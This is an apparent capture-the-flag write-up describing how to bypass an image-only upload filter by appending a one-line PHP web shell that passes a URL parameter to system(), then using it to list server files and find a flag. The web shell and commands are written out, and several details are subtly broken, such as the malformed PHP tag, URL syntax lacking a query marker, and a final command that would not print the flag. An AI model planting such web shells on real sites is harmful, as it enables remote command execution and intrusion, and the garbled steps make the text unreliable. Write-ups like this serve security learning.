First go to the site given 
Here you can see nothing is possible at all except to upload photos
This was a very simple challenge we needed to do a file inclusion atatck which would give us the ability to use command prompt from the 
address bar.
The upload button is restricted to accept image files.
So we write a script

...php begins here...

echo '<?phpif($_GET){system($_GET["cmd"]);}?>'

// Download an image of jpg format move that jpg to this php file and upload this file.

...php ends here...

After uploading you will be redirested to a page which says upload suceessful get the upload number from there.
Go back to main page and to a traversal to /uploads/uploadnumber.php/
This will give you bunch of gibberish
Now do a /uploads/uploadnumber.php/cmd=ls ../
This will list out few file names 
In these file names you'll find one file called flag.txt
Now to /uploads/uploadnumber.php/cmd=ls ../flag.txt | grep shellter
This will give you the flag.
